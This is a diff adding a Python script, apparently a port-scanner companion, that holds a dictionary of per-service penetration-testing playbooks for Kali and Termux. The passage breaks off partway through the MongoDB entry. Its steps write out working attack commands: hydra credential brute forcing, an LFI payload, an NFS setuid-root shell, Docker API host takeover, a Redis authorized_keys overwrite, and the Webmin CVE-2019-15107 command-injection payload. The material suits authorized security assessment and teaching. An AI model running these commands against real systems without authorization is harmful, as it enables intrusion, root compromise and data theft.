@@ -1,0 +1,673 @@
+#!/usr/bin/env python3
+"""
+Playbook Generator for Port Tool
+Creates step-by-step security assessment and penetration testing playbooks
+for Kali Linux and Termux.
+"""
+
+import json
+import os
+
+PLAYBOOKS = {
+    "21": {
+        "service": "FTP (File Transfer Protocol)",
+        "summary": "Cleartext file transfer service. Primary objectives: check anonymous login, inspect server banner for known backdoors, search for sensitive/backup files, and test weak credentials.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Check Anonymous Login",
+                "desc": "Many FTP servers accidentally permit anonymous login with empty or arbitrary passwords, exposing sensitive files.",
+                "kali_cmd": "nmap -p <port> --script ftp-anon <target>",
+                "termux_cmd": "curl -s ftp://anonymous:anonymous@<target>:<port>/ || nc -nv <target> <port>",
+                "indicator": "Look for '230 Login successful' or file directory listings."
+            },
+            {
+                "step": 2,
+                "title": "Banner Grabbing & Known Backdoors",
+                "desc": "Identify exact FTP software version (e.g. vsftpd 2.3.4 contains a backdoor smiley ':)' trigger; ProFTPD 1.3.3c contains a backdoor).",
+                "kali_cmd": "nc -nv <target> <port> && nmap -p <port> -sV --script ftp-vuln* <target>",
+                "termux_cmd": "nc -nv <target> <port>",
+                "indicator": "Inspect greeting for vsftpd 2.3.4, ProFTPD 1.3.5 mod_copy, or pure-ftpd."
+            },
+            {
+                "step": 3,
+                "title": "Brute Force Default / Weak Credentials",
+                "desc": "Check for common admin/service credentials like admin:admin, ftp:ftp, or test wordlists.",
+                "kali_cmd": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt ftp://<target>:<port>",
+                "termux_cmd": "hydra -l ftp -P /sdcard/passwords.txt ftp://<target>:<port> || python3 -m pip install ftplib",
+                "indicator": "Hydra reports valid login credentials [230 User logged in]."
+            },
+            {
+                "step": 4,
+                "title": "Download and Inspect Directory Contents",
+                "desc": "Recursively download accessible files to search for SSH keys, database backups, source code, and .env files.",
+                "kali_cmd": "wget -m --no-passive ftp://anonymous:anonymous@<target>:<port>/",
+                "termux_cmd": "curl -s -u anonymous:anonymous ftp://<target>:<port>/",
+                "indicator": "Look for .sql, .bak, config.php, id_rsa, and credentials."
+            }
+        ]
+    },
+    "22": {
+        "service": "SSH (Secure Shell)",
+        "summary": "Encrypted remote administration terminal. Primary objectives: fingerprint OpenSSH version (check CVEs), test allowed authentication methods (password vs key), test default accounts, and check for weak keys.",
+        "risk": "Medium",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Grab SSH Version & Check CVEs",
+                "desc": "Extract OpenSSH banner to check for known vulnerabilities like regreSSHion (CVE-2024-6387 RCE in glibc-based systems) or Terrapin (CVE-2023-48795).",
+                "kali_cmd": "nc -nv <target> <port> || ssh -v -p <port> none@<target>",
+                "termux_cmd": "nc -nv <target> <port>",
+                "indicator": "Review banner (e.g. 'SSH-2.0-OpenSSH_9.2p1'). OpenSSH 8.5p1 to 9.7p1 are vulnerable to regreSSHion."
+            },
+            {
+                "step": 2,
+                "title": "Enumerate Supported Authentication Methods",
+                "desc": "Determine if the server accepts password authentication or strictly enforces public key authentication.",
+                "kali_cmd": "ssh -v -o PreferredAuthentications=none -p <port> user@<target> 2>&1 | grep 'Authentications that can continue'",
+                "termux_cmd": "ssh -v -o PreferredAuthentications=none -p <port> user@<target> 2>&1 | grep 'Authentications'",
+                "indicator": "If 'password' is listed, credential brute forcing is possible."
+            },
+            {
+                "step": 3,
+                "title": "Test Default / Common Credentials",
+                "desc": "Test common administrative and hardware accounts (e.g. root:root, admin:admin, pi:raspberry, ubuntu:ubuntu).",
+                "kali_cmd": "hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt ssh://<target>:<port> -t 4",
+                "termux_cmd": "hydra -l root -P /sdcard/passwords.txt ssh://<target>:<port> -t 4",
+                "indicator": "Valid login discovered by Hydra."
+            },
+            {
+                "step": 4,
+                "title": "Audit Ciphers and Key Exchange Algorithms",
+                "desc": "Scan for obsolete/deprecated ciphers such as 3DES, CBC mode ciphers, and weak MD5/SHA1 MACs.",
+                "kali_cmd": "nmap -p <port> --script ssh2-enum-algos <target>",
+                "termux_cmd": "ssh -Q cipher",
+                "indicator": "Presence of 'arcfour', 'blowfish', or '3des-cbc'."
+            }
+        ]
+    },
+    "23": {
+        "service": "Telnet",
+        "summary": "Legacy unencrypted interactive text protocol. All traffic is sent in cleartext without encryption. Primary objectives: check banner, test default device passwords, and sniff traffic if on LAN.",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Connect and Inspect Login Banner",
+                "desc": "Connect to inspect the operating system, router make/model, and login prompt.",
+                "kali_cmd": "telnet <target> <port> || nc -nv <target> <port>",
+                "termux_cmd": "nc -nv <target> <port>",
+                "indicator": "Exposes router model (e.g. Cisco, MikroTik, BusyBox, Huawei)."
+            },
+            {
+                "step": 2,
+                "title": "Test Vendor Default Router / IoT Credentials",
+                "desc": "Test factory default combinations (admin:admin, root:root, admin:password, cisco:cisco, root:toor).",
+                "kali_cmd": "hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://<target>:<port>",
+                "termux_cmd": "hydra -l admin -p admin telnet://<target>:<port>",
+                "indicator": "Direct shell prompt (e.g. '# ', '$ ', 'Router>') obtained."
+            },
+            {
+                "step": 3,
+                "title": "Network Sniffing Alert (If Local Subnet / Wi-Fi)",
+                "desc": "Because Telnet transmits passwords in cleartext, any attacker on the local network or Wi-Fi can capture credentials.",
+                "kali_cmd": "sudo tcpdump -i any -A -s 0 'tcp port <port>' | grep -i -E 'login|user|pass'",
+                "termux_cmd": "echo 'Telnet sends plaintext credentials across the wire; capture with tshark/tcpdump.'",
+                "indicator": "Cleartext username and password strings visible in packet payload."
+            }
+        ]
+    },
+    "25": {
+        "service": "SMTP (Simple Mail Transfer Protocol)",
+        "summary": "Mail delivery agent. Primary objectives: check for open relay (spam exploitation), enumerate valid local user mailboxes via VRFY/EXPN, and test STARTTLS encryption.",
+        "risk": "Medium",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Test for Open Mail Relay",
+                "desc": "An open relay permits unauthorized third parties to route spam and phishing emails through the server.",
+                "kali_cmd": "nmap -p <port> --script smtp-open-relay <target>",
+                "termux_cmd": "python3 -c \"import smtplib; s = smtplib.SMTP('<target>', <port>); print(s.ehlo())\"",
+                "indicator": "Nmap script reports 'Server is an open relay'."
+            },
+            {
+                "step": 2,
+                "title": "Enumerate System Accounts (VRFY / EXPN / RCPT TO)",
+                "desc": "Many mail servers leak valid operating system user accounts through VRFY or RCPT TO commands.",
+                "kali_cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <target> -p <port>",
+                "termux_cmd": "nmap -p <port> --script smtp-enum-users <target>",
+                "indicator": "Server responds with '250 User exists' or '252 Cannot verify'."
+            },
+            {
+                "step": 3,
+                "title": "Verify STARTTLS Configuration",
+                "desc": "Ensure the mail transport is protected against passive interception by testing STARTTLS support.",
+                "kali_cmd": "openssl s_client -starttls smtp -connect <target>:<port>",
+                "termux_cmd": "openssl s_client -starttls smtp -connect <target>:<port>",
+                "indicator": "Inspect SSL/TLS certificate subject, issuer, and cipher suite."
+            }
+        ]
+    },
+    "53": {
+        "service": "DNS (Domain Name System)",
+        "summary": "Name resolution protocol. Primary objectives: test for unauthorized DNS zone transfer (AXFR), test for open recursive resolver (DDoS amplification), and brute force subdomains.",
+        "risk": "Medium",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Attempt Full Zone Transfer (AXFR)",
+                "desc": "A misconfigured DNS server allows full zone transfers, leaking all internal hostnames, subdomains, and IP mappings.",
+                "kali_cmd": "dig axfr @<target> <target_domain> || host -l <target_domain> <target>",
+                "termux_cmd": "dig axfr @<target> <target_domain>",
+                "indicator": "Outputs full list of A, CNAME, MX, and TXT records."
+            },
+            {
+                "step": 2,
+                "title": "Check for Open Recursive Resolver",
+                "desc": "Open resolvers can be abused in DNS amplification DDoS attacks.",
+                "kali_cmd": "dig @<target> google.com A +norecurse",
+                "termux_cmd": "dig @<target> google.com A",
+                "indicator": "Query responds with answers to non-authoritative external domains."
+            },
+            {
+                "step": 3,
+                "title": "Enumerate Subdomains via Wordlist",
+                "desc": "Brute force common hostnames (dev, api, admin, vpn, mail, internal, test).",
+                "kali_cmd": "nmap -p 53 --script dns-brute --script-args dns-brute.domain=<target_domain> <target>",
+                "termux_cmd": "for s in www mail dev test api vpn; do dig @<target> $s.<target_domain> +short; done",
+                "indicator": "Resolves previously hidden internal server IPs."
+            }
+        ]
+    },
+    "80": {
+        "service": "HTTP Web Server",
+        "summary": "Unencrypted web application traffic. Primary objectives: technology fingerprinting, directory and endpoint discovery, security headers check, vulnerability scan, and web application attack analysis.",
+        "risk": "Medium",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Fingerprint Technologies & CMS",
+                "desc": "Identify web server (Apache, Nginx, IIS), backend languages (PHP, Node, Python), and CMS (WordPress, Joomla, Drupal).",
+                "kali_cmd": "whatweb -a 3 http://<target>:<port> && curl -I -s http://<target>:<port>",
+                "termux_cmd": "curl -I -s http://<target>:<port>",
+                "indicator": "Look at 'Server', 'X-Powered-By', cookies, and HTML comments."
+            },
+            {
+                "step": 2,
+                "title": "Discover Hidden Directories & Files (Fuzzing)",
+                "desc": "Enumerate unlinked admin portals, backup files (.bak, .sql), environment configs (.env), and API routes.",
+                "kali_cmd": "gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json,env,bak -t 20",
+                "termux_cmd": "nmap -p <port> --script http-enum <target> || curl -s http://<target>:<port>/robots.txt",
+                "indicator": "HTTP 200/301 responses on /admin, /api, /backup, /.env, /phpmyadmin."
+            },
+            {
+                "step": 3,
+                "title": "Inspect Sensitive Informational Files",
+                "desc": "Directly check for common files that disclose sensitive system details.",
+                "kali_cmd": "curl -s http://<target>:<port>/robots.txt http://<target>:<port>/sitemap.xml http://<target>:<port>/.git/HEAD",
+                "termux_cmd": "curl -s http://<target>:<port>/robots.txt",
+                "indicator": "Disallowed paths in robots.txt or 'ref: refs/heads/main' in /.git/HEAD (source code exposure)."
+            },
+            {
+                "step": 4,
+                "title": "Run Automated Web Vulnerability Scan",
+                "desc": "Scan for outdated server software, default files, and dangerous HTTP methods (PUT, DELETE).",
+                "kali_cmd": "nikto -h http://<target>:<port> -Tuning 123b",
+                "termux_cmd": "nmap -p <port> --script http-vuln* <target>",
+                "indicator": "Identifies CVEs, directory indexing, and missing security headers."
+            },
+            {
+                "step": 5,
+                "title": "Test Web Application Vulnerabilities",
+                "desc": "Inspect user inputs and parameters for SQL Injection, Cross-Site Scripting (XSS), and Local File Inclusion (LFI).",
+                "kali_cmd": "sqlmap -u 'http://<target>:<port>/index.php?id=1' --batch --banner",
+                "termux_cmd": "curl -s 'http://<target>:<port>/?file=../../../../etc/passwd' | grep root",
+                "indicator": "Root entries from /etc/passwd or database dump via sqlmap."
+            }
+        ]
+    },
+    "443": {
+        "service": "HTTPS (HTTP Secure)",
+        "summary": "TLS/SSL encrypted web service. Primary objectives: inspect TLS certificate for domain and internal hostname leaks, check for obsolete SSL/TLS protocols and weak ciphers, and audit the web application.",
+        "risk": "Low",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Inspect SSL/TLS Certificate for Reconnaissance",
+                "desc": "Extract Subject Alternative Names (SANs), Common Name (CN), and Issuer to discover associated subdomains and internal domain structure.",
+                "kali_cmd": "openssl s_client -connect <target>:<port> -servername <target> 2>/dev/null | openssl x509 -text -noout | grep -E 'Subject:|DNS:'",
+                "termux_cmd": "openssl s_client -connect <target>:<port> 2>/dev/null | openssl x509 -noout -subject -issuer",
+                "indicator": "Reveals internal naming convention (e.g. dev-internal.corp.com)."
+            },
+            {
+                "step": 2,
+                "title": "Audit SSL/TLS Protocols & Ciphers",
+                "desc": "Check for deprecated protocols (SSLv2, SSLv3, TLS 1.0, TLS 1.1) and historic vulnerabilities (Heartbleed, POODLE, ROBOT).",
+                "kali_cmd": "nmap -p <port> --script ssl-enum-ciphers,ssl-heartbleed <target>",
+                "termux_cmd": "openssl s_client -tls1_1 -connect <target>:<port>",
+                "indicator": "Grade C or lower, or acceptance of SSLv3 / TLS 1.0."
+            },
+            {
+                "step": 3,
+                "title": "Web Directory & Vulnerability Audit (HTTPS)",
+                "desc": "Run content discovery and vulnerability assessment over the encrypted HTTPS connection.",
+                "kali_cmd": "gobuster dir -k -u https://<target>:<port> -w /usr/share/wordlists/dirb/common.txt -t 20",
+                "termux_cmd": "curl -k -I https://<target>:<port>/",
+                "indicator": "Accessible administrative panels and sensitive endpoints."
+            }
+        ]
+    },
+    "445": {
+        "service": "SMB (Server Message Block) / Microsoft-DS",
+        "summary": "Windows file sharing and Active Directory core transport. Primary objectives: check for EternalBlue (MS17-010), enumerate anonymous null shares, list domain users, and check SMB signing.",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Check for Critical SMB RCE Vulnerabilities (MS17-010 / SMBGhost)",
+                "desc": "EternalBlue (MS17-010) and SMBGhost (CVE-2020-0796) allow instant SYSTEM-level remote code execution without credentials.",
+                "kali_cmd": "nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 <target>",
+                "termux_cmd": "nmap -p 445 --script smb-vuln-ms17-010 <target>",
+                "indicator": "Reports 'VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1'."
+            },
+            {
+                "step": 2,
+                "title": "Enumerate Anonymous Shares (Null Session)",
+                "desc": "Test if SMB allows unauthenticated listing of network shares and file downloads.",
+                "kali_cmd": "smbclient -N -L //<target> || crackmapexec smb <target> -u '' -p '' --shares",
+                "termux_cmd": "nmap -p 445 --script smb-enum-shares <target>",
+                "indicator": "Read access granted on IPC$, C$, SYSVOL, or departmental backup shares."
+            },
+            {
+                "step": 3,
+                "title": "Enumerate Domain Users, Groups, and Password Policy",
+                "desc": "Extract Active Directory users, computer names, and lockout threshold policies.",
+                "kali_cmd": "enum4linux -a <target> || rpcclient -U '' -N <target> -c 'enumdomusers'",
+                "termux_cmd": "nmap -p 445 --script smb-enum-users <target>",
+                "indicator": "Dumps valid domain user lists for password spraying."
+            },
+            {
+                "step": 4,
+                "title": "Check SMB Signing (Relay Attack Surface)",
+                "desc": "If SMB signing is NOT required, attackers can perform NTLM Relay attacks to gain code execution.",
+                "kali_cmd": "crackmapexec smb <target> | grep 'signing:False'",
+                "termux_cmd": "nmap -p 445 --script smb2-security-mode <target>",
+                "indicator": "'message_signing: disabled' or 'signing: False'."
+            }
+        ]
+    },
+    "1433": {
+        "service": "MSSQL (Microsoft SQL Server)",
+        "summary": "Enterprise database engine. Primary objectives: test default 'sa' administrator credentials, check for unauthenticated access, and verify if xp_cmdshell is enabled for OS command execution.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Test Default 'sa' Administrator Credentials",
+                "desc": "Test common MSSQL administrative logins (sa with blank password, sa:password, sa:sa).",
+                "kali_cmd": "crackmapexec mssql <target> -u sa -p '' -p 'password' -p 'sa' || hydra -l sa -P passwords.txt mssql://<target>:<port>",
+                "termux_cmd": "nmap -p <port> --script ms-sql-empty-password <target>",
+                "indicator": "Reports '[+] mssql://sa:... SUCCESS'."
+            },
+            {
+                "step": 2,
+                "title": "Check Database Version & Instance Name",
+                "desc": "Determine SQL Server edition and patch level.",
+                "kali_cmd": "nmap -p <port> --script ms-sql-info <target>",
+                "termux_cmd": "nc -nv <target> <port>",
+                "indicator": "Shows instance name and SQL Server build."
+            },
+            {
+                "step": 3,
+                "title": "Test Remote Command Execution via xp_cmdshell",
+                "desc": "If credentials are valid, check if xp_cmdshell allows executing arbitrary operating system commands.",
+                "kali_cmd": "impacket-mssqlclient sa@<target> -windows-auth",
+                "termux_cmd": "echo 'Use impacket-mssqlclient to enable xp_cmdshell and execute whoami.'",
+                "indicator": "Successful execution of system commands (e.g. 'nt authority\\system')."
+            }
+        ]
+    },
+    "2049": {
+        "service": "NFS (Network File System)",
+        "summary": "Unix/Linux remote shared filesystem. Primary objectives: enumerate exported shares (`showmount`), mount the share locally, and check for root privilege escalation (`no_root_squash`).",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "List All Exported Network Shares",
+                "desc": "Discover which directories are exported and which IP subnets are allowed to access them.",
+                "kali_cmd": "showmount -e <target>",
+                "termux_cmd": "nmap -p <port> --script nfs-showmount <target>",
+                "indicator": "Returns list of exports (e.g. '/var/www *' or '/home *')."
+            },
+            {
+                "step": 2,
+                "title": "Mount Export Locally and Read Files",
+                "desc": "Attach the remote directory to your local filesystem without requiring passwords.",
+                "kali_cmd": "sudo mkdir -p /mnt/nfs && sudo mount -t nfs <target>:/exported_dir /mnt/nfs -o nolock",
+                "termux_cmd": "nmap -p <port> --script nfs-ls <target>",
+                "indicator": "Access to remote files in /mnt/nfs."
+            },
+            {
+                "step": 3,
+                "title": "Check for no_root_squash Privilege Escalation",
+                "desc": "If the export is configured with `no_root_squash`, files written as root retain full root SUID ownership.",
+                "kali_cmd": "cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash",
+                "termux_cmd": "echo 'If no_root_squash is enabled, upload a setuid root binary to gain root on target.'",
+                "indicator": "Executing `./rootbash -p` on target provides instant root shell."
+            }
+        ]
+    },
+    "2375": {
+        "service": "Docker Daemon REST API (Unencrypted)",
+        "summary": "Direct access to Docker engine without TLS. CRITICAL RISK: Anyone can interact with Docker to mount the host's root filesystem and gain instant root execution.",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Verify Unauthenticated Docker API Access",
+                "desc": "Check if Docker engine answers API requests without client certificates.",
+                "kali_cmd": "curl -s http://<target>:<port>/version | jq .",
+                "termux_cmd": "curl -s http://<target>:<port>/version",
+                "indicator": "Returns Docker engine version and OS details."
+            },
+            {
+                "step": 2,
+                "title": "List Running Containers and Images",
+                "desc": "Inspect running containers and proprietary Docker images.",
+                "kali_cmd": "docker -H tcp://<target>:<port> ps -a",
+                "termux_cmd": "curl -s http://<target>:<port>/containers/json",
+                "indicator": "Returns active container names and exposed ports."
+            },
+            {
+                "step": 3,
+                "title": "Instant Root Command Execution on Host",
+                "desc": "Spawn a container mounting the host root filesystem (`/`) to gain complete control over the host OS.",
+                "kali_cmd": "docker -H tcp://<target>:<port> run -v /:/host_root --rm -it alpine chroot /host_root",
+                "termux_cmd": "echo 'Run: docker -H tcp://<target>:<port> run -v /:/host -it alpine chroot /host'",
+                "indicator": "Root terminal shell on the underlying host operating system."
+            }
+        ]
+    },
+    "3306": {
+        "service": "MySQL / MariaDB",
+        "summary": "Popular relational database. Primary objectives: check for default root login without password, enumerate database tables, test for remote access grants, and check UDF code execution.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Test Default Root Login (Blank Password)",
+                "desc": "Test if MySQL root user is configured without a password or with default passwords.",
+                "kali_cmd": "mysql -h <target> -P <port> -u root || nmap -p <port> --script mysql-empty-password <target>",
+                "termux_cmd": "nmap -p <port> --script mysql-empty-password <target>",
+                "indicator": "Direct access to `mysql>` interactive shell prompt."
+            },
+            {
+                "step": 2,
+                "title": "Enumerate Databases and User Accounts",
+                "desc": "Scan for database schemas, hashes, and configuration details.",
+                "kali_cmd": "nmap -p <port> --script mysql-databases,mysql-users <target>",
+                "termux_cmd": "nc -nv <target> <port>",
+                "indicator": "Dumps database names and MySQL password hashes for cracking."
+            },
+            {
+                "step": 3,
+                "title": "Password Spray / Brute Force",
+                "desc": "Test common administrative credentials against the MySQL database service.",
+                "kali_cmd": "hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt mysql://<target>:<port>",
+                "termux_cmd": "hydra -l root -P /sdcard/passwords.txt mysql://<target>:<port>",
+                "indicator": "Hydra discovers valid username and password."
+            }
+        ]
+    },
+    "3389": {
+        "service": "RDP (Microsoft Remote Desktop)",
+        "summary": "Windows GUI remote management. Primary objectives: check for BlueKeep (CVE-2019-0708 RCE), verify Network Level Authentication (NLA) enforcement, and perform credential spraying.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Check for BlueKeep Vulnerability (CVE-2019-0708)",
+                "desc": "BlueKeep allows unauthenticated remote code execution on Windows 7, Server 2008, and XP.",
+                "kali_cmd": "nmap -p <port> --script rdp-vuln-ms12-020 <target>",
+                "termux_cmd": "nmap -p <port> --script rdp-enum-encryption <target>",
+                "indicator": "Reports 'State: VULNERABLE'."
+            },
+            {
+                "step": 2,
+                "title": "Check Network Level Authentication (NLA)",
+                "desc": "If NLA is disabled, the login screen is displayed publicly, exposing the Windows lock screen and user usernames.",
+                "kali_cmd": "nmap -p <port> --script rdp-ntlm-info <target>",
+                "termux_cmd": "nmap -p <port> --script rdp-ntlm-info <target>",
+                "indicator": "Dumps internal NetBIOS name, DNS domain name, and Windows OS build."
+            },
+            {
+                "step": 3,
+                "title": "Establish Graphical RDP Session",
+                "desc": "Connect using FreeRDP or rdesktop to verify credentials or capture screen.",
+                "kali_cmd": "xfreerdp /v:<target>:<port> /u:Administrator /p:password /cert-ignore",
+                "termux_cmd": "echo 'Use an Android RDP app or xfreerdp to connect.'",
+                "indicator": "Windows desktop interface loads successfully."
+            }
+        ]
+    },
+    "5432": {
+        "service": "PostgreSQL Database",
+        "summary": "Advanced open-source relational database. Primary objectives: test default 'postgres' user credentials, check for unauthenticated network access, and test command execution via COPY FROM PROGRAM.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Test Default 'postgres' Account Credentials",
+                "desc": "Check if default administrative user 'postgres' has a blank password, 'postgres', or 'password'.",
+                "kali_cmd": "psql -h <target> -p <port> -U postgres || hydra -l postgres -P passwords.txt postgres://<target>:<port>",
+                "termux_cmd": "nmap -p <port> --script pgsql-empty-password <target>",
+                "indicator": "Enters `postgres=#` command prompt."
+            },
+            {
+                "step": 2,
+                "title": "Check for Remote Command Execution via COPY FROM PROGRAM",
+                "desc": "PostgreSQL versions 9.3+ allow superusers to run arbitrary operating system commands.",
+                "kali_cmd": "psql -h <target> -U postgres -c \"CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami'; SELECT * FROM cmd_exec;\"",
+                "termux_cmd": "echo 'Run COPY ... FROM PROGRAM in psql to execute OS commands.'",
+                "indicator": "Returns 'postgres' operating system user."
+            }
+        ]
+    },
+    "5900": {
+        "service": "VNC (Virtual Network Computing)",
+        "summary": "Cross-platform graphical desktop sharing. Primary objectives: test for VNC Null Authentication bypass, test weak passwords, and connect to view screen.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Check for VNC Null Authentication",
+                "desc": "Many misconfigured VNC servers allow connections with no password specified (Type 1: None).",
+                "kali_cmd": "nmap -p <port> --script vnc-info,vnc-title <target>",
+                "termux_cmd": "nmap -p <port> --script vnc-info <target>",
+                "indicator": "Nmap reports 'Authentication types: None'."
+            },
+            {
+                "step": 2,
+                "title": "Brute Force VNC Passwords",
+                "desc": "VNC passwords are limited to 8 characters and are frequently weak (e.g. password, admin, 12345678).",
+                "kali_cmd": "hydra -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt vnc://<target>:<port>",
+                "termux_cmd": "hydra -P /sdcard/passwords.txt vnc://<target>:<port>",
+                "indicator": "Hydra outputs valid 8-character VNC password."
+            },
+            {
+                "step": 3,
+                "title": "Connect to Desktop via VNC Viewer",
+                "desc": "View and interact with the remote desktop directly.",
+                "kali_cmd": "vncviewer <target>:<port>",
+                "termux_cmd": "echo 'Use AVNC or bVNC viewer on Android to connect.'",
+                "indicator": "Remote screen interactive display."
+            }
+        ]
+    },
+    "6379": {
+        "service": "Redis In-Memory Key-Value Database",
+        "summary": "High-performance data store. CRITICAL RISK: Redis defaults to no authentication. If left exposed, attackers can dump memory, inject SSH keys, or schedule cron jobs for root RCE.",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Test Unauthenticated Access (PING Probe)",
+                "desc": "Verify if the Redis server accepts commands without an AUTH password.",
+                "kali_cmd": "redis-cli -h <target> -p <port> ping",
+                "termux_cmd": "nc -nv <target> <port> <<< 'PING'",
+                "indicator": "Server responds with '+PONG' (CRITICAL: Database is unprotected!)."
+            },
+            {
+                "step": 2,
+                "title": "Extract System Info & Dump Database Keys",
+                "desc": "Extract Redis version, operating system details, and examine cached session keys.",
+                "kali_cmd": "redis-cli -h <target> -p <port> info && redis-cli -h <target> -p <port> keys '*'",
+                "termux_cmd": "echo -e 'INFO\r\n' | nc -nv <target> <port>",
+                "indicator": "Dumps system architecture, Redis version, and secret keys."
+            },
+            {
+                "step": 3,
+                "title": "Arbitrary File Write (SSH Authorized Keys / Root RCE)",
+                "desc": "If Redis is running as root, overwrite /root/.ssh/authorized_keys to achieve direct root SSH access.",
+                "kali_cmd": "redis-cli -h <target> -p <port> config set dir /root/.ssh/ && redis-cli -h <target> -p <port> config set dbfilename authorized_keys",
+                "termux_cmd": "echo 'Configure dir /root/.ssh/ and dbfilename authorized_keys in redis-cli.'",
+                "indicator": "Returns '+OK' allowing SSH login as root without password."
+            }
+        ]
+    },
+    "8080": {
+        "service": "HTTP Alternate / Tomcat / Jenkins / Spring Boot",
+        "summary": "Secondary web application server. Primary objectives: check for Apache Tomcat manager, Jenkins Groovy console, and Spring Boot Actuator endpoints.",
+        "risk": "High",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Check for Tomcat Manager Web Interface",
+                "desc": "Apache Tomcat /manager/html allows uploading WAR packages for instant shell access.",
+                "kali_cmd": "curl -s -I http://<target>:<port>/manager/html | grep -E '401|200'",
+                "termux_cmd": "curl -s -I http://<target>:<port>/manager/html",
+                "indicator": "HTTP 401 with 'WWW-Authenticate: Basic realm=\"Tomcat Manager Application\"'."
+            },
+            {
+                "step": 2,
+                "title": "Test Default Tomcat Credentials",
+                "desc": "Test common vendor defaults (tomcat:s3cret, admin:admin, tomcat:tomcat).",
+                "kali_cmd": "hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://<target>:<port>/manager/html",
+                "termux_cmd": "curl -u tomcat:s3cret http://<target>:<port>/manager/html",
+                "indicator": "Access to Tomcat Web Application Manager granted."
+            },
+            {
+                "step": 3,
+                "title": "Check for Unauthenticated Jenkins Script Console",
+                "desc": "Jenkins without security enabled exposes /script, granting arbitrary Groovy system code execution.",
+                "kali_cmd": "curl -s http://<target>:<port>/script | grep -i 'Jenkins'",
+                "termux_cmd": "curl -s http://<target>:<port>/script",
+                "indicator": "Script console textarea allowing `println \"whoami\".execute().text`."
+            },
+            {
+                "step": 4,
+                "title": "Check for Spring Boot Actuator Information Leaks",
+                "desc": "Spring Boot apps often expose sensitive environment variables and passwords at /actuator/env.",
+                "kali_cmd": "curl -s http://<target>:<port>/actuator/env http://<target>:<port>/actuator/heapdump",
+                "termux_cmd": "curl -s http://<target>:<port>/actuator",
+                "indicator": "Exposes database passwords, AWS keys, and JWT secrets."
+            }
+        ]
+    },
+    "9200": {
+        "service": "Elasticsearch REST API",
+        "summary": "Distributed search database. CRITICAL RISK: Unsecured Elasticsearch instances have caused massive public data breaches. Anyone can query and dump all documents.",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Verify Unauthenticated Cluster Access",
+                "desc": "Query the cluster root endpoint to verify authentication status and cluster name.",
+                "kali_cmd": "curl -s http://<target>:<port>/ | jq .",
+                "termux_cmd": "curl -s http://<target>:<port>/",
+                "indicator": "Returns cluster name, Lucene version, and tagline 'You Know, for Search'."
+            },
+            {
+                "step": 2,
+                "title": "List All Database Indices and Document Counts",
+                "desc": "Identify indexes containing customer data, audit logs, or credentials.",
+                "kali_cmd": "curl -s 'http://<target>:<port>/_cat/indices?v'",
+                "termux_cmd": "curl -s 'http://<target>:<port>/_cat/indices?v'",
+                "indicator": "Displays table of indices, doc count, and storage size."
+            },
+            {
+                "step": 3,
+                "title": "Dump Raw Documents from Sensitive Index",
+                "desc": "Extract documents and records from target indices.",
+                "kali_cmd": "curl -s 'http://<target>:<port>/_search?size=25&pretty=true'",
+                "termux_cmd": "curl -s 'http://<target>:<port>/_search?size=10'",
+                "indicator": "JSON payload containing user records, PII, and logs."
+            }
+        ]
+    },
+    "10000": {
+        "service": "Webmin (System Administration GUI)",
+        "summary": "Web-based Unix management panel. Primary objectives: check for CVE-2019-15107 backdoor in password_change.cgi and test root password brute force.",
+        "risk": "Critical",
+        "steps": [
+            {
+                "step": 1,
+                "title": "Check for Webmin Backdoor (CVE-2019-15107)",
+                "desc": "Webmin versions 1.890 through 1.920 contained an unauthenticated root command execution backdoor.",
+                "kali_cmd": "curl -k -s https://<target>:<port>/password_change.cgi -d 'user=root&pam=1&expired=2|id' | grep 'uid='",
+                "termux_cmd": "curl -k -s https://<target>:<port>/password_change.cgi -d 'user=root&pam=1&expired=2|id'",
+                "indicator": "Outputs 'uid=0(root) gid=0(root)' indicating direct remote code execution."
+            },
+            {
+                "step": 2,
+                "title": "Brute Force Webmin Login",
+                "desc": "Test common Unix administrative credentials.",
+                "kali_cmd": "hydra -l root -P passwords.txt https-post-form://<target>:<port>/session_login.cgi:page=%2F&user=^USER^&pass=^PASS^:Failed",
+                "termux_cmd": "echo 'Hydra web form brute force for Webmin.'",
+                "indicator": "Valid session cookie obtained."
+            }
+        ]
+    },
+    "27017": {
+        "service": "MongoDB NoSQL Database",
+        "summary": "NoSQL document database. CRITICAL RISK: Frequently exposed on 0.0.0.0 without authentication. Target for automated ransomware and data extortion.",
+        "risk": "Critical",
